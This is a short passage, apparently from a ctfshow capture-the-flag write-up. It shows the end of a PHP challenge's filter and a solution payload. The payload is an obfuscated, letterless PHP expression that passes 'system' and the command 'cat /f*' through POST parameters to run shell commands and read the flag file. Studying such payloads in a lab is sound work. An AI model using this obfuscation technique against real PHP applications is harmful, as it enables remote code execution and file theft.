            echo("Are you hacking me AGAIN?");
        }
    }else{
        phpinfo();
    }
}
```

```php
ctf_show=$_=(_/_._)[_];++$_;$__=$_.$_++;++$_;++$_;$$_[$_=_.$__.++$_.++$_]($$_[_]);&_POST=system&_=cat /f*
```

